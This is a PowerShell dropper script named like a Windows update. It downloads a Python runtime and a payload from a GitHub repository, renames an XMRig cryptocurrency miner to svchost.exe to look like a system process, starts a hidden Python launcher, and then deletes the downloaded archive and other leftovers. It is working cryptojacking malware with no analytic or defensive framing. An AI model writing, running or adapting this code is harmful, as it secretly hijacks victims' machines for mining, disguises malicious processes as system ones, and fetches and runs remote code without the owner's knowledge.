# --- THE FINAL MASTER (WinUpdate.ps1) ---
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Configuration - MATCHING YOUR 'UPDATA' SPELLING
$C_URL = "https://github.com/itzcurled/footbalhunt/raw/main/WinServices.py"
$Z_URL = "https://github.com/itzcurled/footbalhunt/raw/main/UpdataData.zip"

# 2. Hard Reset (Cleanup old mess)
if (Test-Path $Path) { Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $Path -Force | Out-Null

# 3. Shadow Engine Setup (No-Python Fix)
$PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
Remove-Item "$Path\py.zip"

# 4. Deployment
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.zip"
Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force

# Search for xmrig.exe and rename it to svchost.exe
$Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }

# 5. Activation
$PY_EXEC = "$Path\python\pythonw.exe"
if (Test-Path $PY_EXEC) {
    Start-Process -FilePath $PY_EXEC -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
}

# 6. Final Cleanup
Remove-Item -Path "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
Get-ChildItem -Path $Path -Directory | Where-Object { $_.Name -ne "python" } | Remove-Item -Recurse -Force
